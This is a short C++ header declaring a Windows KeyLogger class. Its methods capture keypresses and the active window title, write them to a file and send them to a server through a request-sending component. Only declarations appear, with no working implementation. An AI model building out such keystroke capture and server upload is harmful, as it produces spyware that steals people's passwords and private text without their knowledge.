#pragma once
#include <map>
#include <string>
#include <thread>
#include <vector>
#include "RequestSender.h"

#ifndef __wtypes_h__
#include <wtypes.h>
#endif

#ifndef __WINDEF_
#include <windef.h>
#endif

#ifndef __RPC_H__
#include <rpc.h>
#endif

#ifndef _WINUSER_
#include <winuser.h>
#endif

/*
Records keypresses and logs them to a text file
*/

class KeyLogger
{
public:
	KeyLogger() {};
	static void dataToOut(std::string dataToSend);
	static std::string returnChar(char c);
	static std::string returnForegroundWindow(HWND newWin);
	// this should really be in RequestSender
	static void dataToServer(std::string dataToSend);

private:
	bool activeWindowChanged = false;
};
